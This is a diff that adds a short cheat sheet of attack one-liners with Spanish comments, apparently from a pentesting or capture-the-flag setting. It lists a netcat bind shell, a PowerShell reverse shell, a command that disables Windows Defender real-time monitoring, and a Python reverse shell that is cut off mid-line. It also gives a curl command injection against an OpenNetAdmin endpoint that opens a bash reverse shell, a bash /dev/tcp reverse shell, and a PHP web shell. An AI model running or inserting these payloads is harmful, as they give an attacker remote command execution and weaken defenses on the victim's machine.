@@ -1,0 +1,23 @@
+          ##---  Shell   ---
+---  Linux  ---
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l x.x.x.x xxx > /tmp/f
+#En la maquina objetivo ejecuto esto. Pone en escucha en el puerto xxx.
+nc -lvnp x.x.x.x xxx
+#En mi maquina de ataque me conecto al puerto xxx del objetivo x.x.x.x
+
+---	Windows	---
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ip_attack',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+#Reverse shell desde windows a nuestro linux. Una vez ejecutado correctamente me conecto mediante netcat
+	Set-MpPreference -DisableRealtimeMonitoring $true
+	#En el caso de tener problemas con windows defender se puede desacticar con este comando
+
+
+
+
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh">
+
+curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.14.11/443 0>%261'&xajaxargs[]=ping" http://10.10.10.171/ona/
+
+bash -c 'bash -i >& /dev/tcp/10.10.14.11/443 0>&1''
+
+<?php system($_GET["cmd"]); ?>
